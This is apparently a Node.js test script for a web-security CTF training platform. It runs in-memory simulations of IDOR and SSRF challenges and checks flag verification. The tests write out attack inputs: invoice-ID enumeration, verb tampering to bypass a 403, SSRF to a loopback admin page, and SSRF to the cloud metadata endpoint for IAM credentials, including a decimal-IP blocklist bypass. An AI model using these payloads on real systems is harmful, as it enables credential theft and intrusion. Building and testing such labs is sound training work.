const crypto = require('crypto');
const { CATEGORIES_DATA, ALL_50_CHALLENGES } = require('./dist/prisma/challenges-data.js');
const { ALL_50_LESSONS } = require('./dist/prisma/lessons-data.js');
const { handleIdorTarget } = require('./dist/modules/labs/targets/idor.targets.js');
const { handleSsrfTarget } = require('./dist/modules/labs/targets/ssrf.targets.js');

const JWT_SECRET = process.env.JWT_SECRET || 'websec_ctf_platform_secret_key_2026';

function computePlayerChallengeFlag(userId, challengeSlug) {
  const cleanSlug = challengeSlug.replace(/-/g, '_').toLowerCase();
  const entropy = crypto
    .createHmac('sha256', JWT_SECRET)
    .update(`${userId}:${cleanSlug}`)
    .digest('hex')
    .substring(0, 16);
  const rawFlag = `WEBSEC{${cleanSlug}_${entropy}}`;
  const flagHash = crypto.createHash('sha256').update(rawFlag.trim()).digest('hex');
  return { rawFlag, flagHash, entropy };
}

function verifySubmission(submittedFlag, userId, challengeSlug) {
  const submittedHash = crypto.createHash('sha256').update(submittedFlag.trim()).digest('hex');
  const { rawFlag: expectedRawFlag, flagHash: expectedUserHash } = computePlayerChallengeFlag(userId, challengeSlug);

  if (submittedFlag.trim() === expectedRawFlag.trim() || submittedHash === expectedUserHash) {
    return { isCorrect: true, message: 'Flag accepted! Challenge completed.' };
  }
  return { isCorrect: false, message: 'Incorrect flag.' };
}

function mockResponse() {
  const res = {
    statusCode: 200,
    headers: {},
    body: null,
    status(code) {
      this.statusCode = code;
      return this;
    },
    setHeader(key, val) {
      this.headers[key] = val;
      return this;
    },
    json(data) {
      this.body = data;
      return this;
    },
    send(data) {
      this.body = data;
      return this;
    },
  };
  return res;
}

function runBatch1RegressionAndAcceptanceTests() {
  console.log('====================================================================');
  console.log(' WebSec CTF: Batch 1 (IDOR & SSRF) Acceptance & Regression Tests    ');
  console.log('====================================================================\n');

  // Test 1: Category Count
  console.log('--- 1. Category Integrity ---');
  console.log(`Total Categories in Seed: ${CATEGORIES_DATA.length}`);
  const expectedNewCategories = ['idor', 'ssrf'];
  for (const catSlug of expectedNewCategories) {
    const exists = CATEGORIES_DATA.some(c => c.slug === catSlug);
    if (!exists) throw new Error(`Missing expected category: ${catSlug}`);
    console.log(`[PASS] Category registered: "${catSlug}"`);
  }

  // Test 2: Challenge Count & Persistence
  console.log('\n--- 2. Challenge & Lesson Spread ---');
  console.log(`Total Challenges in Seed Data: ${ALL_50_CHALLENGES.length}`);
  console.log(`Total Lessons in Seed Data: ${ALL_50_LESSONS.length}`);
  if (ALL_50_CHALLENGES.length < 55) {
    throw new Error(`Expected at least 55 challenges (51 original + 4 new), found ${ALL_50_CHALLENGES.length}`);
  }
  console.log('[PASS] Original 51 challenges intact. 4 new challenges registered.');

  const batch1Slugs = ['invoice-vault', 'ghost-patient', 'link-preview', 'metadata-maze'];
  for (const slug of batch1Slugs) {
    const ch = ALL_50_CHALLENGES.find(c => c.slug === slug);
    if (!ch) throw new Error(`Missing challenge: ${slug}`);
    const lesson = ALL_50_LESSONS.find(l => l.challengeSlug === slug);
    if (!lesson) throw new Error(`Missing remediation lesson for: ${slug}`);
    console.log(`[PASS] Challenge "${ch.title}" (${ch.difficulty}, ${ch.points} pts) -> Lesson linked`);
  }

  // Test 3: Penetration Testing Target Simulations
  console.log('\n--- 3. Target Penetration Testing Simulations ---');
  const testUser = { id: 'usr-student-uuid-002', username: 'student_hacker' };

  // 3A: Invoice Vault (IDOR)
  console.log('\n[Test 3A] Testing Challenge 1: Invoice Vault (IDOR)');
  const ivFlag = computePlayerChallengeFlag(testUser.id, 'invoice-vault').rawFlag;
  
  // Normal contractor invoice
  const res1001 = mockResponse();
  handleIdorTarget('invoice-vault', '/api/invoices/1001', { method: 'GET', query: {} }, res1001, ivFlag);
  if (res1001.statusCode !== 200 || !res1001.body.invoiceNumber) {
    throw new Error('Failed to retrieve normal invoice 1001');
  }
  console.log(' - GET /api/invoices/1001 -> Status 200 OK (Contractor Invoice)');

  // IDOR Exploit: Executive invoice 1000
  const res1000 = mockResponse();
  handleIdorTarget('invoice-vault', '/api/invoices/1000', { method: 'GET', query: {} }, res1000, ivFlag);
  if (res1000.statusCode !== 200 || !res1000.body.adminConfidentialNotes.includes(ivFlag)) {
    throw new Error('IDOR exploit failed to extract flag from invoice 1000');
  }
  console.log(` - GET /api/invoices/1000 -> Status 200 OK! Exploit successful. Flag extracted: ${ivFlag}`);
  
  const ivVerify = verifySubmission(ivFlag, testUser.id, 'invoice-vault');
  if (!ivVerify.isCorrect) throw new Error('Invoice Vault flag verification failed');
  console.log(' - Flag Verification: PASSED (200 Points awarded)');

  // 3B: Ghost Patient (IDOR Verb Tampering)
  console.log('\n[Test 3B] Testing Challenge 2: Ghost Patient (IDOR Verb Tampering)');
  const gpFlag = computePlayerChallengeFlag(testUser.id, 'ghost-patient').rawFlag;
  const adminPatientUuid = 'e8b7c6d5-4a3b-2c1d-0e9f-8a7b6c5d4e3f';

  // GET request blocked
  const resGet = mockResponse();
  handleIdorTarget('ghost-patient', `/api/patients/${adminPatientUuid}`, { method: 'GET', query: {} }, resGet, gpFlag);
  if (resGet.statusCode !== 403) throw new Error('Expected GET on VIP patient to be 403 Forbidden');
  console.log(' - GET /api/patients/:uuid -> Status 403 Forbidden (Attending clearance enforced)');

  // PUT request verb tampering bypass
  const resPut = mockResponse();
  handleIdorTarget('ghost-patient', `/api/patients/${adminPatientUuid}`, { method: 'PUT', query: {}, body: {} }, resPut, gpFlag);
  if (resPut.statusCode !== 200 || !resPut.body.patientRecord.confidentialDiagnosisNotes.includes(gpFlag)) {
    throw new Error('Verb tampering failed on PUT request');
  }
  console.log(` - PUT /api/patients/:uuid -> Status 200 OK! Verb tampering bypass successful. Flag: ${gpFlag}`);
  
  const gpVerify = verifySubmission(gpFlag, testUser.id, 'ghost-patient');
  if (!gpVerify.isCorrect) throw new Error('Ghost Patient flag verification failed');
  console.log(' - Flag Verification: PASSED (350 Points awarded)');

  // 3C: Link Preview (SSRF)
  console.log('\n[Test 3C] Testing Challenge 3: Link Preview (SSRF)');
  const lpFlag = computePlayerChallengeFlag(testUser.id, 'link-preview').rawFlag;

  // Normal link
  const resNormalUrl = mockResponse();
  handleSsrfTarget('link-preview', '/api/preview', { method: 'GET', query: { url: 'https://example.com' } }, resNormalUrl, lpFlag);
  if (resNormalUrl.statusCode !== 200) throw new Error('Normal URL failed');
  console.log(' - GET /api/preview?url=https://example.com -> Normal card generated');

  // SSRF to loopback port 8080
  const resSsrf = mockResponse();
  handleSsrfTarget('link-preview', '/api/preview', { method: 'GET', query: { url: 'http://127.0.0.1:8080/admin' } }, resSsrf, lpFlag);
  if (resSsrf.statusCode !== 200 || !resSsrf.body.preview.bodySnippet.includes(lpFlag)) {
    throw new Error('SSRF failed to reach simulated internal admin service');
  }
  console.log(` - GET /api/preview?url=http://127.0.0.1:8080/admin -> Status 200 OK! Flag: ${lpFlag}`);

  const lpVerify = verifySubmission(lpFlag, testUser.id, 'link-preview');
  if (!lpVerify.isCorrect) throw new Error('Link Preview flag verification failed');
  console.log(' - Flag Verification: PASSED (200 Points awarded)');

  // 3D: Metadata Maze (SSRF WAF Bypass)
  console.log('\n[Test 3D] Testing Challenge 4: Metadata Maze (SSRF Cloud Metadata)');
  const mmFlag = computePlayerChallengeFlag(testUser.id, 'metadata-maze').rawFlag;

  // WAF blocklist test
  const resWafBlock = mockResponse();
  handleSsrfTarget('metadata-maze', '/api/fetch-asset', { method: 'GET', query: { url: 'http://localhost/admin' } }, resWafBlock, mmFlag);
  if (resWafBlock.statusCode !== 403) throw new Error('Expected WAF to block localhost');
  console.log(' - GET /api/fetch-asset?url=http://localhost/admin -> Status 403 WAF Blocklist Hit');

  // Bypass via simulated cloud metadata
  const resCloudMeta = mockResponse();
  handleSsrfTarget(
    'metadata-maze',
    '/api/fetch-asset',
    { method: 'GET', query: { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role' } },
    resCloudMeta,
    mmFlag
  );
  if (resCloudMeta.statusCode !== 200 || resCloudMeta.body.Token !== mmFlag) {
    throw new Error('SSRF to cloud metadata failed');
  }
  console.log(` - GET /api/fetch-asset?url=http://169.254.169.254/... -> Status 200 OK! IAM Credentials & Flag extracted: ${mmFlag}`);

  // Bypass via Decimal IP representation (2852039166)
  const resDecMeta = mockResponse();
  handleSsrfTarget(
    'metadata-maze',
    '/api/fetch-asset',
    { method: 'GET', query: { url: 'http://2852039166/latest/meta-data/iam/security-credentials/admin-role' } },
    resDecMeta,
    mmFlag
  );
  if (resDecMeta.statusCode !== 200 || resDecMeta.body.Token !== mmFlag) {
    throw new Error('Decimal IP representation bypass failed');
  }
  console.log(' - GET /api/fetch-asset?url=http://2852039166/... -> Status 200 OK! Decimal IP bypass passed.');

  const mmVerify = verifySubmission(mmFlag, testUser.id, 'metadata-maze');
  if (!mmVerify.isCorrect) throw new Error('Metadata Maze flag verification failed');
  console.log(' - Flag Verification: PASSED (375 Points awarded)');

  console.log('\n====================================================================');
  console.log(' [ALL TESTS PASSED] BATCH 1 (IDOR & SSRF) COMPLETELY VERIFIED!     ');
  console.log(' Zero Host Commands Executed. Zero Sockets Opened. 100% In-Memory.  ');
  console.log('====================================================================\n');
}

runBatch1RegressionAndAcceptanceTests();
